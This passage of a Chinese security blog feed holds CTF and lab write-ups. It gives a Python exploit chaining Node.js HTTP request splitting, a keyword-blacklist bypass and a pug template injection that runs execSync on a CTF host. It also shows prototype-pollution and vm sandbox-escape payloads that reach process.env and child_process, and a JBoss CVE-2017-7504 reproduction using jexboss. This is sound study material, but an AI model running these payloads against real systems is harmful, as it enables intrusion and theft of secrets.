punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"error occurs!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                              <span class="token comment">// node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                </span>        http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                              resp<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">"ECONNRESET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Timeout occurs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">&#125;</span>                              <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment">// 返回结果输出到/core                    </span>          resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                                          resps <span class="token operator">=</span> chunk<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                          res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>resps<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                          res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">&#125;</span>                              <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"search param 'q' missing!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">// 关键字waf 利用字符串拼接实现绕过 </span><span class="token keyword">function</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> evilwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span> <span class="token string">"mainModule"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token string">"root"</span><span class="token punctuation">,</span> <span class="token string">"child_process"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> arrayLen <span class="token operator">=</span> evilwords<span class="token punctuation">.</span>length<span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> trigger <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>evilwords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">return</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8081</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> host <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address      <span class="token keyword">var</span> port <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>port      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Example app listening at http://%s:%s"</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token triple-quoted-string string">""" HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZUlQgK81vgN7OB8A&#123;&#125;"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span>body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""------WebKitFormBoundaryZUlQgK81vgN7OB8AContent-Disposition: form-data; name="file"; filename="lethe.pug"Content-Type: ../template-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")-return x------WebKitFormBoundaryZUlQgK81vgN7OB8A--"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">,</span> body<span class="token punctuation">)</span> \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'\u012b'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\u0120'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\r\n'</span><span class="token punctuation">,</span> <span class="token string">'\u010d\u010a'</span><span class="token punctuation">)</span>    \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'\u0122'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'\u0a27'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">'\u015b'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\u015d'</span><span class="token punctuation">)</span> \    <span class="token operator">+</span> <span class="token string">'GET'</span> <span class="token operator">+</span> <span class="token string">'\u0120'</span> <span class="token operator">+</span> <span class="token string">'/'</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://ec05f88c-b4d9-4408-bdc5-56e251328bb1.node4.buuoj.cn:81/core?q='</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://ec05f88c-b4d9-4408-bdc5-56e251328bb1.node4.buuoj.cn:81/?action=lethe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p><h2 id="2-nodejs原型链污染"><a href="#2-nodejs原型链污染" class="headerlink" title="2 nodejs原型链污染"></a>2 nodejs原型链污染</h2><h3 id="2-1-prototype原型"><a href="#2-1-prototype原型" class="headerlink" title="2.1 prototype原型"></a>2.1 prototype原型</h3><p><strong>简介：</strong></p><p>对于使用过基于类的语言 (如 Java 或 C++) 的开发者们来说，JavaScript 实在是有些令人困惑 —— JavaScript 是动态的，本身不提供一个 <code>class</code> 的实现。即便是在 ES2015/ES6 中引入了 <code>class</code> 关键字，但那也只是语法糖，JavaScript 仍然是基于原型的。</p><p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong>）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p><p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的实例。</p><p>尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>age</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">=</span>age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">toString</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I'm "</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">" And I'm "</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> fn<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token string">'xiaoming'</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn<span class="token punctuation">.</span>toString<span class="token operator">===</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>toString<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn<span class="token punctuation">.</span>__proto__<span class="token operator">===</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token operator">===</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token operator">===</span><span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/04/03/O5xBBkjw.png"></p><h3 id="2-2-原型链污染原理"><a href="#2-2-原型链污染原理" class="headerlink" title="2.2 原型链污染原理"></a>2.2 原型链污染原理</h3><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// foo是一个简单的JavaScript对象</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">bar</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token comment">// foo.bar 此时为1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// 修改foo的原型（即Object）</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span><span class="token comment">// 由于查找顺序的原因，foo.bar仍然是1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// 此时再用Object创建一个空的zoo对象</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// 查看zoo.bar，此时bar为2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-原型链污染配合RCE"><a href="#2-3-原型链污染配合RCE" class="headerlink" title="2.3 原型链污染配合RCE"></a>2.3 原型链污染配合RCE</h3><p>有原型链污染的前提之下，我们可以控制基类的成员，赋值为一串恶意代码，从而造成代码注入。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">bar</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token string">'require(\'child_process\').execSync(\'open /System/Applications/Calculator.app/\');'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-vm沙箱逃逸"><a href="#3-vm沙箱逃逸" class="headerlink" title="3 vm沙箱逃逸"></a>3 vm沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸</p><p>逃逸例子：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> env <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">this.constructor.constructor('return this.process.env')()</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>Script</span><span class="token punctuation">(</span><span class="token string">"this.constructor.constructor('return this.process.env')()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>env <span class="token operator">=</span> script<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行以上两个例子之后可以获取到主程序环境中的环境变量（两个例子代码等价）</p><p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p><p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p><p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> env <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('whoami').toString()</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/7184#toc-0">https://xz.aliyun.com/t/7184#toc-0</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> javascript </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JBOSS未授权访问</title>
      <link href="/2022/04/02/jboss-wei-shou-quan-fang-wen/"/>
      <url>/2022/04/02/jboss-wei-shou-quan-fang-wen/</url>
      
        <content type="html"><![CDATA[<p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x01-什么是jboss"><a href="#0x01-什么是jboss" class="headerlink" title="0x01 什么是jboss"></a>0x01 什么是jboss</h2><p>Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p><h2 id="0x02-什么是jboss未授权访问"><a href="#0x02-什么是jboss未授权访问" class="headerlink" title="0x02 什么是jboss未授权访问"></a>0x02 什么是jboss未授权访问</h2><p>未授权访问管理控制台,通过该漏洞,可以后台管理服务,可以通过脚本命令执行系统命令,如反弹shell,wget写webshell文件。</p><h2 id="0x03-漏洞复现（使用CVE-2017-7504的漏洞环境）"><a href="#0x03-漏洞复现（使用CVE-2017-7504的漏洞环境）" class="headerlink" title="0x03 漏洞复现（使用CVE-2017-7504的漏洞环境）"></a>0x03 漏洞复现（使用CVE-2017-7504的漏洞环境）</h2><p>使用vulhub漏洞平台，启用环境位置：vulhub–jboss–cve-2017-7504</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">docker-compose</span> up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启用成功使用浏览器访问 IP:8080    </p><p><img src="https://imgtp.apqiang.com/2022/04/02/hzoBdxlX.png"></p><p>弱口令进入后台</p><p><img src="https://imgtp.apqiang.com/2022/04/02/nmWwbAd9.png"></p><p>找到入口</p><p><img src="https://imgtp.apqiang.com/2022/04/02/jQemMqLh.png"></p><p>找到 addURL() 接口</p><p><img src="https://imgtp.apqiang.com/2022/04/02/giIQ8LNR.png"></p><p>下载脚本利用 <a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/tools/jexboss<span class="token punctuation">]</span>└─$ python3 jexboss.py -husage: JexBoss <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> <span class="token punctuation">[</span>--version<span class="token punctuation">]</span> <span class="token punctuation">[</span>--auto-exploit<span class="token punctuation">]</span> <span class="token punctuation">[</span>--disable-check-updates<span class="token punctuation">]</span> <span class="token punctuation">[</span>-mode <span class="token punctuation">&#123;</span>standalone,auto-scan,file-scan<span class="token punctuation">&#125;</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--app-unserialize<span class="token punctuation">]</span>               <span class="token punctuation">[</span>--servlet-unserialize<span class="token punctuation">]</span> <span class="token punctuation">[</span>--jboss<span class="token punctuation">]</span> <span class="token punctuation">[</span>--jenkins<span class="token punctuation">]</span> <span class="token punctuation">[</span>--struts2<span class="token punctuation">]</span> <span class="token punctuation">[</span>--jmxtomcat<span class="token punctuation">]</span> <span class="token punctuation">[</span>--proxy PROXY<span class="token punctuation">]</span> <span class="token punctuation">[</span>--proxy-cred LOGIN:PASS<span class="token punctuation">]</span>               <span class="token punctuation">[</span>--jboss-login LOGIN:PASS<span class="token punctuation">]</span> <span class="token punctuation">[</span>--timeout TIMEOUT<span class="token punctuation">]</span> <span class="token punctuation">[</span>--cookies <span class="token assign-left variable">NAME</span><span class="token operator">=</span>VALUE<span class="token punctuation">]</span> <span class="token punctuation">[</span>--reverse-host RHOST:RPORT<span class="token punctuation">]</span> <span class="token punctuation">[</span>--cmd CMD<span class="token punctuation">]</span> <span class="token punctuation">[</span>--dns URL<span class="token punctuation">]</span> <span class="token punctuation">[</span>--windows<span class="token punctuation">]</span>               <span class="token punctuation">[</span>--post-parameter PARAMETER<span class="token punctuation">]</span> <span class="token punctuation">[</span>--show-payload<span class="token punctuation">]</span> <span class="token punctuation">[</span>--gadget <span class="token punctuation">&#123;</span>commons-collections3.1,commons-collections4.0,jdk7u21,jdk8u20,groovy1,dns<span class="token punctuation">&#125;</span><span class="token punctuation">]</span>               <span class="token punctuation">[</span>--load-gadget FILENAME<span class="token punctuation">]</span> <span class="token punctuation">[</span>--force<span class="token punctuation">]</span> <span class="token punctuation">[</span>-host HOST<span class="token punctuation">]</span> <span class="token punctuation">[</span>-network NETWORK<span class="token punctuation">]</span> <span class="token punctuation">[</span>-ports PORTS<span class="token punctuation">]</span> <span class="token punctuation">[</span>-results FILENAME<span class="token punctuation">]</span> <span class="token punctuation">[</span>-file FILENAME_HOSTS<span class="token punctuation">]</span>               <span class="token punctuation">[</span>-out FILENAME_RESULTS<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行脚本指定ip和端口</p><p>python3 jexboss.py -u ip:port</p><p>执行，工具会一次检测一下项目，有漏洞就会显示红色的：VULNERABLE（易受攻击的），工具就会根据找到容易受到攻击的点，进行利用，然后选择yes，开始创建连接</p><p><img src="https://imgtp.apqiang.com/2022/04/02/lJ0hAQCa.png"></p><p>连接后执行命令</p><p><img src="https://imgtp.apqiang.com/2022/04/02/NUB5FnxI.png"></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 外部打点 </tag>
            
            <tag> web </tag>
            
            <tag> 未授权 </tag>
            
            <tag> JBOSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未授权漏洞</title>
      <link href="/2022/03/31/wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2022/03/31/wei-shou-quan-fang-wen-lou-dong/</url>
      
